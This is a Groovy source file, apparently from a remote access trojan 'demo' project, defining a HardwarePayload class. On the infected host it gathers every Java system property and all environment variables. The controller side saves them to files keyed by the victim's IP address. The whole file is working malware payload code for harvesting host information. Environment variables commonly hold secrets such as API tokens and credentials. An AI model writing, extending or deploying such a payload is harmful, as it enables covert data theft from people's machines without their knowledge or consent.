package de.tudbut.ttd.ratdemo.payload.impl

import de.tudbut.tools.Tools
import de.tudbut.ttd.ratdemo.payload.Payload
import de.tudbut.ttd.ratdemo.payload.PayloadCommunicator
import tudbut.io.TypedInputStream
import tudbut.io.TypedOutputStream
import tudbut.parsing.TCN

import java.nio.charset.StandardCharsets

class HardwarePayload implements Payload {

    @Override
    void serialize(TypedOutputStream stream) {
        Properties properties = System.getProperties()
        String[] props = []
        properties.stringPropertyNames().collect {
            props += it
            props += properties.getProperty(it)
        }
        stream.writeInt(props.length / 2 as int)
        props.collect {
            stream.writeString(it)
        }

        TCN env = new TCN()
        System.getenv().collect {
            env.set(it.key, it.value)
        }
        stream.writeString(Tools.mapToString(env.toMap()))
    }

    @Override
    void onReceive(TypedInputStream stream, String ip, PayloadCommunicator communicator) {
        FileOutputStream fos

        Properties properties = new Properties()
        int i = stream.readInt()
        for (j in 0..<i) {
            properties.setProperty(stream.readString(), stream.readString())
        }
        fos = new FileOutputStream(ip + '_sysprop.properties')
        properties.store(fos, 'System properties of ' + ip)
        fos.close()

        fos = new FileOutputStream("${ip}_env.map")
        fos.write(stream.readString().getBytes(StandardCharsets.ISO_8859_1))
        fos.close()
    }
}
